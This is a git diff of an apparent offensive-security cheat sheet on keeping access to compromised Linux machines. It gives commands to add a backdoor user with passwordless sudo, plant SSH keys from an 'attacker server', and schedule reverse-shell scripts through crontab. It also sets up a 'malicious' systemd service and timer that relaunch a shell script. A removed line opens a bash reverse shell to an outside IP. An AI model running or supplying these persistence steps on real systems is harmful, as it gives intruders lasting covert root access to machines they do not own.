@@ -1,12 +1,16 @@
-[generate an ssh key on attacker server](https://docs.github.com/en/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent)
+basic reverse shells [revshell generator](https://www.revshells.com/)
 
-### add user
+[art of linux persistence](https://hadess.io/the-art-of-linux-persistence/)
+
+## add user
 
 ```
 echo -e "drowssap\\drowssap\\" | useradd dev; usermod -aG sudo dev; echo "dev ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 ```
 
-### create ssh keys
+## SSH Persistence
+
+[generate an ssh key on attacker server](https://docs.github.com/en/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent)
 
 on attacker server
 ```
@@ -23,18 +27,64 @@ on attacker server
 ssh -i id_rsa user@${box_ip}
 ```
 
-### basic reverse shells [revshell generator](https://www.revshells.com/)
+## crontab / cronjob reverse shells (every minute)
 
-**crontab / cronjob reverse shells (every minute)**
-
-nano /etc/
+nano /etc/crontab
 
 ```
 * * * * *    /lib/systemd/revshell.sh
 * * * * *    /usr/bin/revshell.sh
-* * * * *    bash -i >& /dev/tcp/10.10.10.10/1337 0>&1
+* *  * * *  root  /opt/revshell.sh
 ```
-### upgrade revserse shells
+
+### systemd malicious service
+
+nano /etc/systemd/system/malicious.service
+
+```
+[Unit]
+
+Description=Bad service
+
+[Service]
+
+ExecStart=/opt/shell.sh
+```
+
+then create a malicious systemd timer to run that service
+
+nano /etc/systemd/system/malicious.timer
+
+```
+[Unit]
+
+Description=malicious timer
+
+[Timer]
+
+OnBootSec=5
+
+OnUnitActiveSec=5m
+
+[Install]
+
+WantedBy=timers.target
+```
+
+make sure to start the service and enable it to make it working 
+
+```shell
+
+# systemctl daemon-reload 
+
+systemctl enable malicious.timer
+
+systemctl start malicious.timer
+
+```
+
+
+## upgrade revserse shells
 
 
 **improve screen**
